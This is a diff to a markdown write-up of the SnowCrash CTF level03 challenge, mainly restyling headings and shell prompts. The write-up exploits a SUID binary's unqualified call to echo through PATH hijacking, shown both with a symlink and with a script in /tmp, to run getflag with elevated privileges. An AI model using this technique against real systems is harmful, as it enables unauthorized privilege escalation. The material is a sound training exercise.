@@ -1,9 +1,9 @@
 # LEVEL03
 
-## 1. Inspect the file
+## 1. Inspect The Directory
 
 ```bash
-> ls -l
+level03@SnowCrash:~$ ls -l
 total 12
 -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
 ```
@@ -11,16 +11,16 @@ total 12
 The binary `level03` is owned by `flag03`, with the SUID bit set `-rwsr-sr-x`, meaning it will run with the privileges of `flag03`.
 
 ```bash
-> ./level03 
+level03@SnowCrash:~$ ./level03 
 Exploit me
 ```
 
 Running the binary only prints `Exploit me`.
 
-## 2. Analyze the binary
+## 2. Analyze The Binary
 
 ```bash
-> strings level03
+level03@SnowCrash:~$ strings level03
 /lib/ld-linux.so.2
 KT{K
 __gmon_start__
@@ -56,12 +56,12 @@ This means the binary uses `system("/usr/bin/env echo Exploit me")` internally.
 **Explanation:**
 >- strings			: displays printable strings from a binary file.
 
-## 3.a Exploit the binary with link
+## 3.a Exploit The Binary With Link
 
 ```bash
-> export PATH=/tmp:$PATH
-> ln -s /bin/getflag /tmp/echo
-> ./level03
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
+level03@SnowCrash:~$ ./level03
 Check flag.Here is your token : XXX
 ```
 
@@ -75,16 +75,16 @@ When the binary executes `echo`, it actually runs `getflag` with `flag03`'s priv
 >- `ln TARGET LINK`	: create link from `LINK` to `TARGET`.
 >- `-s`				: create a symbolic link from `LINK` to `TARGET`.
 
-## 3.b Exploit the binary with file
+## 3.b Exploit The Binary With Script
 
 ```bash
-> export PATH=/tmp:$PATH
-> cat << EOF > /tmp/echo
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+level03@SnowCrash:~$ cat << EOF > /tmp/echo
 #!/bin/bash
 getflag
 EOF
-> chmod +x /tmp/echo
-> ./level03
+level03@SnowCrash:~$ chmod +x /tmp/echo
+level03@SnowCrash:~$ ./level03
 Check flag.Here is your token : XXX
 ```
 
